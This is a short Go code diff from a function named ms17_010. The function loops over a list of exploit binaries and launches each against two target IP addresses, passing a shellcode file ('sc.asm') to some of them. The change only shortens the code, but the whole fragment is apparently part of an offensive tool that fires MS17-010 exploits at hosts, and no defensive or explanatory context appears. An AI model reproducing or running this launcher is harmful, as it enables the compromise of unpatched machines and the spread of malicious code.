@@ -22,16 +22,12 @@ func ms17_010() {
 		for _, binary := range(binaries) {
 			
 			if strings.Index(binary, "_") != -1 {
-				cmd := exec.Command(binary, ip1, "sc.asm")
-				cmd.Start()
-				cmd = exec.Command(binary, ip2, "sc.asm")
-				cmd.Start()
+				exec.Command(binary, ip1, "sc.asm").Start()
+				exec.Command(binary, ip2, "sc.asm").Start()
 				continue
 			}
-			cmd := exec.Command(binary, ip1)
-			cmd.Start()
-			cmd = exec.Command(binary, ip2)
-			cmd.Start()
+			exec.Command(binary, ip1).Start()
+			exec.Command(binary, ip2).Start()
 		}
 	}
 
